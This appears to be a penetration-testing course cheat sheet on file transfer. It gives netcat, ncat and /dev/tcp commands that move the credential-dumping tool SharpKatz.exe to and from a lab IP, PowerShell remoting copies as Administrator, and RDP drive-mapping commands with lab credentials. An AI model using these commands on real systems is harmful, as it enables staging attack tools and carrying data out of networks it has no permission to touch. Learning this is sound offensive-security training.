
==Netcat and Ncat==

```
# Using Original Netcat 
nc -q 0 192.168.49.128 8000 < SharpKatz.exe 

# Using Ncat 
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

```
# Using Original Netcat 
nc 192.168.49.128 443 > SharpKatz.exe 

# Using Ncat 
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

# Using /dev/TCP
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

==PowerShell Session File Transfer==

```
$Session = New-PSSession -ComputerName DATABASE01
```

```
# Copy file to remote session 
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy file from remote session
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

==RDP (Remote Desktop Protocol)==

```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
